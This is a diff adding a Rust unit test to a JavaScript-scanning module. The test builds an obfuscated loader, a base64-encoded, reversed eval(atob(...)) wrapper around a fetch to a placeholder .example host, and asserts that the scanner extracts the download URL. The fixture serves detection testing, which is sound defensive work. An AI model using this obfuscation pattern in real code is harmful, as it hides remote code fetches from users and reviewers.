@@ -10021,6 +10021,29 @@ mod js_url_extraction_tests {
     }
 
     #[test]
+    fn js_atob_reversed_string_payload_url_extracted() {
+        let mut env = Environment::new(&Config::default());
+        let encoded = base64::Engine::encode(
+            &base64::engine::general_purpose::STANDARD,
+            "fetch('https://atob-reversed-string-js.example/p')",
+        );
+        let reversed: String = encoded.chars().rev().collect();
+        let js = format!(r#"eval(atob("{reversed}".split("").reverse().join("")))"#).into_bytes();
+        env.all_extracted_jscript.push(js);
+        crate::js_scan::scan_js_payloads(&mut env);
+        let has = env.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, .. } if src == "https://atob-reversed-string-js.example/p"
+            )
+        });
+        assert!(
+            has,
+            "JS atob reversed string payload URL missed: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
     fn js_atob_call_payload_url_extracted() {
         let mut env = Environment::new(&Config::default());
         let encoded = base64::Engine::encode(
